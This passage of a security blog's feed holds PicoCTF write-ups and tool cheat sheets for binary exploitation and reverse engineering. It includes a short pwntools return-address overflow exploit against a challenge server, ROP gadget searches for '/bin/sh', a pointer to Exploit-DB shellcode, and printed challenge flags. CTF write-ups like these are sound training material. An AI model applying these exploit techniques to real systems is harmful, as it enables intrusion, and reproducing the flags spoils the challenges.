&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - WPA-ing Out</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/</guid><description>&lt;h1 id="picoctf---wpa-ing-out">
 PicoCTF - WPA-ing Out
 &lt;a class="anchor" href="#picoctf---wpa-ing-out">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/206?category=4&amp;amp;page=2">WPA-ing Out&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10280033">Day 26 Wireless Attacks-無線攻擊(aircrack-ng)&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>I thought that my password was super-secret, but it turns out that passwords passed over the AIR can be CRACKED, especially if I used the same wireless network password as one in the &lt;font color="FF0000">&lt;code>rockyou.txt&lt;/code>&lt;/font> credential dump. Use this &lt;a href="https://artifacts.picoctf.net/c/8/wpa-ing_out.pcap">&lt;code>pcap file&lt;/code>&lt;/a> and the &lt;code>rockyou&lt;/code> wordlist. The flag should be entered in the &lt;code>picoCTF{XXXXXX}&lt;/code> format.&lt;/p></description></item><item><title>PicoCTF - x-sixty-what</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---x-sixty-what/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---x-sixty-what/</guid><description>&lt;h1 id="picoctf---x-sixty-what">
 PicoCTF - x-sixty-what
 &lt;a class="anchor" href="#picoctf---x-sixty-what">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有點奇怪，沒有想像中簡單，看起來就是一個簡單的return 2 function的問題，但是看了objdump的flag function原本應該是0x401236，但是會友segmentation fault，看了其他的WP&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>，發現應該return到0x40123b，不太知道為甚麼&lt;/p>
&lt;ul>
&lt;li>
&lt;p>第一張是return 2 0x401236
&lt;img src="https://hackmd.io/_uploads/Bk2PZ_0ch.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第二張是return 2 0x40123b
&lt;img src="https://hackmd.io/_uploads/SymO-uAqn.png" alt="" />&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>用動態的方式看offset
$$
0x7fffffffd758 - 0x00007fffffffd710 = 0x48
$$&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

r = remote(&amp;#39;saturn.picoctf.net&amp;#39;, 58166)
# r = process(&amp;#39;./vuln&amp;#39;)
context.arch = &amp;#39;amd64&amp;#39;

raw_input()
print(r.recvline().strip().decode())

payload = b&amp;#39;a&amp;#39;*0x48 + p64(0x40123b)
print(payload)
r.sendline(payload)

r.interactive()
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>picoCTF{b1663r_15_b3773r_e79d5a75}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://ctftime.org/writeup/33199">x-sixty-what WP&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item><item><title>PicoCTF - XtraORdinary</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/</guid><description>&lt;h1 id="picoctf---xtraordinary">
 PicoCTF - XtraORdinary
 &lt;a class="anchor" href="#picoctf---xtraordinary">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.finxter.com/how-to-convert-hex-string-to-bytes-in-python/">How to Convert Hex String to Bytes in Python?&lt;/a>
&lt;a href="https://myapollo.com.tw/blog/python-itertools-more-itertools/">Python 好用模組介紹 - itertools &amp;amp; more-itertools&lt;/a>
&lt;a href="https://www.w3schools.com/python/ref_file_readline.asp">Python File readline() Method&lt;/a>
&lt;a href="https://www.geeksforgeeks.org/python-append-to-a-file/">Python append to a file&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/env python3

from random import randint
with open(&amp;#39;flag.txt&amp;#39;, &amp;#39;rb&amp;#39;) as f:
 flag = f.read()

with open(&amp;#39;secret-key.txt&amp;#39;, &amp;#39;rb&amp;#39;) as f:
 key = f.read()

def encrypt(ptxt, key):
 ctxt = b&amp;#39;&amp;#39;
 for i in range(len(ptxt)):
 a = ptxt[i]
 b = key[i % len(key)]
 ctxt += bytes([a ^ b])
 return ctxt

ctxt = encrypt(flag, key)

random_strs = [
 b&amp;#39;my encryption method&amp;#39;,
 b&amp;#39;is absolutely impenetrable&amp;#39;,
 b&amp;#39;and you will never&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;break it&amp;#39;
]

for random_str in random_strs:
 for i in range(randint(0, pow(2, 8))):
 for j in range(randint(0, pow(2, 6))):
 for k in range(randint(0, pow(2, 4))):
 for l in range(randint(0, pow(2, 2))):
 for m in range(randint(0, pow(2, 0))):
 ctxt = encrypt(ctxt, random_str)

with open(&amp;#39;output.txt&amp;#39;, &amp;#39;w&amp;#39;) as f:
 f.write(ctxt.hex())
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF 2023</title><link>https://bernie6401.github.io/docs/security/competition/picoctf-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/picoctf-2023/</guid><description>&lt;h1 id="picoctf-2023">
 PicoCTF 2023
 &lt;a class="anchor" href="#picoctf-2023">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="crypto">
 Crypto
 &lt;a class="anchor" href="#crypto">#&lt;/a>
&lt;/h2>
&lt;h3 id="hidetosee">
 HideToSee
 &lt;a class="anchor" href="#hidetosee">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h4>
&lt;p>這一題比較像是Misc題目，比賽的時候想了很久都沒進展，賽後看了&lt;a href="https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Cryptography/HideToSee/HideToSee.md">write up&lt;/a>才覺得異常簡單，當初應該也是有往這方面想，但沒有用steghide&lt;/p>
&lt;h4 id="exploit---steghide--atbash">
 Exploit - Steghide + Atbash
 &lt;a class="anchor" href="#exploit---steghide--atbash">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>先用steghide解密出隱藏的文檔
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ steghide extract -sf atbash.jpg
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>用&lt;a href="https://www.dcode.fr/atbash-cipher">online tool&lt;/a>解密
&lt;img src="https://hackmd.io/_uploads/rJQVLEnPn.png" alt="" />&lt;/li>
&lt;/ol>
&lt;h2 id="reverse">
 Reverse
 &lt;a class="anchor" href="#reverse">#&lt;/a>
&lt;/h2>
&lt;h3 id="reverse-1">
 Reverse
 &lt;a class="anchor" href="#reverse-1">#&lt;/a>
&lt;/h3>
&lt;p>IDA
Flag: &lt;code>picoCTF{3lf_r3v3r5ing_succe55ful_8108250b}&lt;/code>&lt;/p>
&lt;h3 id="safe-opener-2">
 Safe Opener 2
 &lt;a class="anchor" href="#safe-opener-2">#&lt;/a>
&lt;/h3>
&lt;p>Strings search
Flag: &lt;code>picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_ccb5525e}&lt;/code>&lt;/p>
&lt;h3 id="timer">
 timer
 &lt;a class="anchor" href="#timer">#&lt;/a>
&lt;/h3>
&lt;p>Use &lt;code>mobsf&lt;/code>
Flag: &lt;code>picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}&lt;/code>&lt;/p>
&lt;h3 id="ready-gladiator-0">
 Ready Gladiator 0
 &lt;a class="anchor" href="#ready-gladiator-0">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>???&lt;/li>
&lt;li>&lt;code>picoCTF{h3r0_t0_z3r0_4m1r1gh7_a220a377}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="forensics">
 Forensics
 &lt;a class="anchor" href="#forensics">#&lt;/a>
&lt;/h2>
&lt;h3 id="hideme">
 hideme
 &lt;a class="anchor" href="#hideme">#&lt;/a>
&lt;/h3>
&lt;p>Use &lt;code>binwalk&lt;/code> to observe that it should be a &lt;code>zip&lt;/code> file.&lt;/p></description></item><item><title>PWN Overview</title><link>https://bernie6401.github.io/docs/tools/ctf/pwn-overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/pwn-overview/</guid><description>&lt;h1 id="pwn-overview">
 PWN Overview
 &lt;a class="anchor" href="#pwn-overview">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools-cheat">
 Tools Cheat
 &lt;a class="anchor" href="#tools-cheat">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Commonly Used Commands
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ file {file path}
$ checksec {file path} # sudo apt-get install checksec
$ objdump -M intel -d {file path} | less
$ gdb {file path} # sudo apt-get install gdb
$ readelf -a {file path} | less # 查看所有資訊，包含section/file-header/program headers/symbol tables/等等
$ readelf -S {file path} # 只查看sections&amp;#39; header
$ ldd {file path} # to check what libraries the file used
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Command Used Tools / Plugin
&lt;ul>
&lt;li>&lt;a href="https://github.com/longld/peda">gdb-peda&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/longld/peda.git ~/peda
$ echo &amp;#34;source ~/peda/peda.py&amp;#34; &amp;gt;&amp;gt; ~/.gdbinit
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://github.com/radareorg/radare2">radare2&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/radare/radare2.git
$ sudo apt install build-essential # just for wsl
$ sudo ./radare2/sys/install.sh
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://www.exploit-db.com/shellcodes">Exploit DB - Shell Code&lt;/a>：如果要寫shell code的話可以直接看exploit db上別人寫好的gadget，複製起來就可以用了，不過有時候也有可能會失敗，在確認其他東西都是正確的情況下，可以試看看別的，記得平台要選對&lt;/li>
&lt;li>&lt;a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install python3-pip
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo -H python3 -m pip install ROPgadget
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --help
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># For using&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> | grep &lt;span style="color:#e6db74">&amp;#39;pop rax.*ret&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Or&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --only &lt;span style="color:#e6db74">&amp;#34;pop|ret|syscall&amp;#34;&lt;/span> &amp;gt; rop_gadget.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --only &lt;span style="color:#e6db74">&amp;#34;pop|ret|syscall&amp;#34;&lt;/span> --multibr &amp;gt; rop_gadget.txt &lt;span style="color:#75715e"># multibr是multi bransh允許多分支的gadget&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 取得特定string的gadget&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --string &lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>&lt;a href="https://github.com/david942j/one_gadget">one_gadget&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install rubygems
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo gem install one_gadget
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ one_gadget &lt;span style="color:#f92672">{&lt;/span>libc file&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>seccomp-tools
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install gcc ruby-dev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ gem install seccomp-tools
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ seccomp-tools dump ./test
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>找glibc版本的online tool
&lt;a href="https://libc.rip/">libc-database search API Search&lt;/a>
&lt;a href="https://libc.blukat.me/?q=__libc_start_main_ret">libc database search&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="gdb">
 gdb
 &lt;a class="anchor" href="#gdb">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler 常用語法(&lt;a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">cheat&lt;/a>)&lt;/p></description></item><item><title>Reverse Overview</title><link>https://bernie6401.github.io/docs/tools/ctf/reverse-overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/reverse-overview/</guid><description>&lt;h1 id="reverse-overview">
 Reverse Overview
 &lt;a class="anchor" href="#reverse-overview">#&lt;/a>
&lt;/h1>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Type&lt;/th>
 &lt;th>App&lt;/th>
 &lt;th>.NET&lt;/th>
 &lt;th>x86/x64&lt;/th>
 &lt;th>Packer&lt;/th>
 &lt;th>Python&lt;/th>
 &lt;th>C&lt;/th>
 &lt;th>General&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>Description&lt;/td>
 &lt;td>&lt;li> MobSF: Must run in python &lt;code>3.8&lt;/code>&lt;/li>&lt;li>ApkTool: Just follow the step in &lt;a href="https://apktool.org/docs/install/">install guide&lt;/a>&lt;/li>&lt;/td>
 &lt;td>To decompile C#(.NET)&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>指令：&lt;code>$ upx -d {filename}&lt;/code>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>一個可以把組語轉換成c pseudo code的線上工具&lt;/td>
 &lt;td>一個線上的decompiler，結合多種工具，只要上傳檔案(小於2MB)就可以呈現多種decompiler tools的結果&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Link&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10215522">MobSF&lt;/a>&lt;/br>&lt;a href="https://apktool.org/">ApkTools&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://github.com/dnSpy/dnSpy/releases">dnSpy&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://carlosrafaelgn.com.br/Asm86/">x86模擬器&lt;/a>&lt;/br>&lt;a href="https://defuse.ca/online-x86-assembler.htm#disassembly">x86/x64 assembler/disassembler&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://github.com/upx/upx/releases/tag/v4.0.2">UPX Packer&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://tool.lu/pyc/">Pyc disassemble&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://godbolt.org/">Compiler Explorer&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://dogbolt.org/">Decompiler Explorer&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="ida-常用快捷鍵">
 IDA 常用快捷鍵
 &lt;a class="anchor" href="#ida-%e5%b8%b8%e7%94%a8%e5%bf%ab%e6%8d%b7%e9%8d%b5">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://blog.30cm.tw/2018/01/ida.html">IDA Interface&lt;/a>&lt;/li>
&lt;li>型別
&lt;ul>
&lt;li>char(1 byte)&lt;/li>
&lt;li>WORD(2 bytes)&lt;/li>
&lt;li>DWORD(4 bytes)&lt;/li>
&lt;li>PDWORD(pointer of DWORD = DWORD *)&lt;/li>
&lt;li>若是DWORD *name，代表name這個變數是一個pointer而且指向的地方是一個DWORD&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Space: 在 Text View / Graph View 切換&lt;/li>
&lt;li>Tab: 在視窗之間切換&lt;/li>
&lt;li>;/Insert: 註解&lt;/li>
&lt;li>x: 秀出 Xrefs&lt;/li>
&lt;li>n: 改名&lt;/li>
&lt;li>y: 改型別&lt;/li>
&lt;li>h: 改表示方式 (dec / hex)&lt;/li>
&lt;li>u: 取消定義&lt;/li>
&lt;li>a: 當成字串&lt;/li>
&lt;li>c: 當成code&lt;/li>
&lt;li>p: 當成function&lt;/li>
&lt;li>t: set sizeof(XXX)；如果已經確定目前的constant就是某個變數的length，那可以直接按t讓他變成sizeof(那個變數)
舉例：如果已經確定目前的&lt;code>0x238&lt;/code>就是&lt;code>PROCESSENTRY32W&lt;/code>的size，就可以直接這樣用，會變得比較清楚
:::spoiler 結果
&lt;img src="https://hackmd.io/_uploads/S1nruHTza.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rkjwuBTza.png" alt="" />
:::&lt;/li>
&lt;li>Shift+F1: show出Local Type視窗
:::spoiler Local Types Screenshot
&lt;img src="https://hackmd.io/_uploads/S1ikDa5_n.png" alt="" />
:::&lt;/li>
&lt;li>Shift+F12: 開啟Strings視窗
:::spoiler Strings Screenshot
&lt;img src="https://hackmd.io/_uploads/HybvLzo_2.png" alt="" />
:::&lt;/li>
&lt;li>對某一個數值按m: ENUM這個功能就是在替換一些常見的windows API參數，讓原本的純數字可以用文字表示，這樣比較好懂API的操作，逆向會更順暢(補充說明：IDA有收錄很多MSDN上的一些API，他每一個參數表示的文字，例如&lt;a href="https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants">這一篇&lt;/a>底下有顯示很多Constant/value的對應，而正常情況下IDA會顯示的是value，如果要把它換成Constant文字的表達式就可以用到ENUM這個功能)，又例如:
目前已經知道&lt;code>CreateToolhelp32Snapshot(2, 0);&lt;/code>中的2的意義是&lt;code>TH32CS_SNAPPROCESS&lt;/code>(可以參考&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot#parameters">MSDN&lt;/a>)，此時就可以直接按m之後再選擇&lt;code>TH32CS_SNAPPROCESS&lt;/code>
:::spoiler
&lt;img src="https://hackmd.io/_uploads/B1Rn5Q6G6.png" alt="" />
:::&lt;/li>
&lt;li>\: 不顯示/顯示資料型別&lt;/li>
&lt;li>Alt+M/Ctrl+M: 前者是註冊書籤，後者是察看並選擇標籤，可以快速跑到標示的地址&lt;/li>
&lt;li>Ctrl+E: 如果是分析DLL file，可能會有很多不同的entry point，利用這個shortcut可以顯示目前有幾個entry point，很方便
:::spoiler
&lt;img src="https://hackmd.io/_uploads/ryJw-C6Ga.png" alt="" />
:::&lt;/li>
&lt;li>如何把bytes變成字串:
&lt;ul>
&lt;li>可以直接Alt+A
:::spoiler&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用&lt;code>Y&lt;/code>定義他的型別成&lt;code>int dword_2008[32]&lt;/code>，前面的int就看每一個字元是來決定，後面&lt;code>[32]&lt;/code>就代表有多少字元變成array；第二種方法就是直接按&lt;code>d&lt;/code>改變一個字元的型態變成int，然後在&lt;code>edit/Array&lt;/code>的地方可以叫出&lt;code>Convert to array&lt;/code>的視窗(如果前面沒有先用&lt;code>d&lt;/code>改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意)
&lt;img src="https://hackmd.io/_uploads/HJ3yvI-Ga.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/r1A_8LWMa.png" alt="" />&lt;/li>
&lt;li>接著就是在&lt;code>Option/String literals&lt;/code>視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style
&lt;img src="https://hackmd.io/_uploads/SyQBP8Zfp.png" alt="" />
:::
:::spoiler 完整流程&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o
.rodata:0000000000002009 db 0
.rodata:000000000000200A db 0
.rodata:000000000000200B db 0
.rodata:000000000000200C db 4Ch ; L
.rodata:000000000000200D db 0
.rodata:000000000000200E db 0
.rodata:000000000000200F db 0
.rodata:0000000000002010 db 41h ; A
.rodata:0000000000002011 db 0
.rodata:0000000000002012 db 0
.rodata:0000000000002013 db 0
.rodata:0000000000002014 db 47h ; G
.rodata:0000000000002015 db 0
.rodata:0000000000002016 db 0
.rodata:0000000000002017 db 0
.rodata:0000000000002018 db 7Bh ; {
.rodata:0000000000002019 db 0
.rodata:000000000000201A db 0
.rodata:000000000000201B db 0
.rodata:000000000000201C db 68h ; h
.rodata:000000000000201D db 0
.rodata:000000000000201E db 0
.rodata:000000000000201F db 0
.rodata:0000000000002020 db 33h ; 3
.rodata:0000000000002021 db 0
.rodata:0000000000002022 db 0
.rodata:0000000000002023 db 0
.rodata:0000000000002024 db 31h ; 1
.rodata:0000000000002025 db 0
.rodata:0000000000002026 db 0
.rodata:0000000000002027 db 0
.rodata:0000000000002028 db 31h ; 1
.rodata:0000000000002029 db 0
.rodata:000000000000202A db 0
.rodata:000000000000202B db 0
.rodata:000000000000202C db 4Fh ; O
.rodata:000000000000202D db 0
.rodata:000000000000202E db 0
.rodata:000000000000202F db 0
.rodata:0000000000002030 db 5Fh ; _
.rodata:0000000000002031 db 0
.rodata:0000000000002032 db 0
.rodata:0000000000002033 db 0
.rodata:0000000000002034 db 72h ; r
.rodata:0000000000002035 db 0
.rodata:0000000000002036 db 0
.rodata:0000000000002037 db 0
.rodata:0000000000002038 db 65h ; e
.rodata:0000000000002039 db 0
.rodata:000000000000203A db 0
.rodata:000000000000203B db 0
.rodata:000000000000203C db 76h ; v
.rodata:000000000000203D db 0
.rodata:000000000000203E db 0
.rodata:000000000000203F db 0
.rodata:0000000000002040 db 65h ; e
.rodata:0000000000002041 db 0
.rodata:0000000000002042 db 0
.rodata:0000000000002043 db 0
.rodata:0000000000002044 db 72h ; r
.rodata:0000000000002045 db 0
.rodata:0000000000002046 db 0
.rodata:0000000000002047 db 0
.rodata:0000000000002048 db 73h ; s
.rodata:0000000000002049 db 0
.rodata:000000000000204A db 0
.rodata:000000000000204B db 0
.rodata:000000000000204C db 31h ; 1
.rodata:000000000000204D db 0
.rodata:000000000000204E db 0
.rodata:000000000000204F db 0
.rodata:0000000000002050 db 6Eh ; n
.rodata:0000000000002051 db 0
.rodata:0000000000002052 db 0
.rodata:0000000000002053 db 0
.rodata:0000000000002054 db 67h ; g
.rodata:0000000000002055 db 0
.rodata:0000000000002056 db 0
.rodata:0000000000002057 db 0
.rodata:0000000000002058 db 5Fh ; _
.rodata:0000000000002059 db 0
.rodata:000000000000205A db 0
.rodata:000000000000205B db 0
.rodata:000000000000205C db 33h ; 3
.rodata:000000000000205D db 0
.rodata:000000000000205E db 0
.rodata:000000000000205F db 0
.rodata:0000000000002060 db 6Eh ; n
.rodata:0000000000002061 db 0
.rodata:0000000000002062 db 0
.rodata:0000000000002063 db 0
.rodata:0000000000002064 db 67h ; g
.rodata:0000000000002065 db 0
.rodata:0000000000002066 db 0
.rodata:0000000000002067 db 0
.rodata:0000000000002068 db 69h ; i
.rodata:0000000000002069 db 0
.rodata:000000000000206A db 0
.rodata:000000000000206B db 0
.rodata:000000000000206C db 6Eh ; n
.rodata:000000000000206D db 0
.rodata:000000000000206E db 0
.rodata:000000000000206F db 0
.rodata:0000000000002070 db 65h ; e
.rodata:0000000000002071 db 0
.rodata:0000000000002072 db 0
.rodata:0000000000002073 db 0
.rodata:0000000000002074 db 65h ; e
.rodata:0000000000002075 db 0
.rodata:0000000000002076 db 0
.rodata:0000000000002077 db 0
.rodata:0000000000002078 db 72h ; r
.rodata:0000000000002079 db 0
.rodata:000000000000207A db 0
.rodata:000000000000207B db 0
.rodata:000000000000207C db 35h ; 5
.rodata:000000000000207D db 0
.rodata:000000000000207E db 0
.rodata:000000000000207F db 0
.rodata:0000000000002080 db 7Dh ; }
.rodata:0000000000002081 db 0
.rodata:0000000000002082 db 0
.rodata:0000000000002083 db 0
.rodata:0000000000002084 db 0
.rodata:0000000000002085 db 0
.rodata:0000000000002086 db 0
.rodata:0000000000002087 db 0
&lt;/code>&lt;/pre>$\downarrow$
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 dword_2008 dd 46h, 4Ch, 41h, 47h, 7Bh, 68h, 33h, 2 dup(31h), 4Fh, 5Fh, 72h, 65h, 76h, 65h, 72h, 73h, 31h, 6Eh, 67h
.rodata:0000000000002008 ; DATA XREF: main+8↑o
.rodata:0000000000002008 dd 5Fh, 33h, 6Eh, 67h, 69h, 6Eh, 2 dup(65h), 72h, 35h, 7Dh, 0
&lt;/code>&lt;/pre>$\downarrow$
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 text &amp;#34;UTF-32LE&amp;#34;, &amp;#39;FLAG{h311O_revers1ng_3ngineer5}&amp;#39;,0
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>如何快速把bytes dump出來
:::spoiler
&lt;ol>
&lt;li>選擇要輸出的bytes
&lt;img src="https://hackmd.io/_uploads/Syc9UkTM6.png" alt="" />&lt;/li>
&lt;li>按Shift+E，跳出的視窗選擇想要的格式，再直接複製即可
&lt;img src="https://hackmd.io/_uploads/SJ7a8ypfT.png" alt="" />
:::&lt;/li>
